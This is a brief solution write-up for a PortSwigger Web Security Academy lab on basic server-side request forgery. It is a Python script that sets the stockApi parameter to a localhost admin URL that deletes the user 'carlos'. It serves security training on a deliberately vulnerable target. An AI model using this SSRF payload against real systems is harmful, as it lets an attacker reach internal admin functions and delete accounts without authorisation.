# Lab: Basic SSRF against the local server

Link to lab: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost

## Solution
```python
import requests

data = 'stockApi=http://localhost/admin/delete?username=carlos'

response = requests.post(
    'https://0a93006004b54f54c074fa48004a00a1.web-security-academy.net/product/stock',
    data=data,
    verify=False,
)
```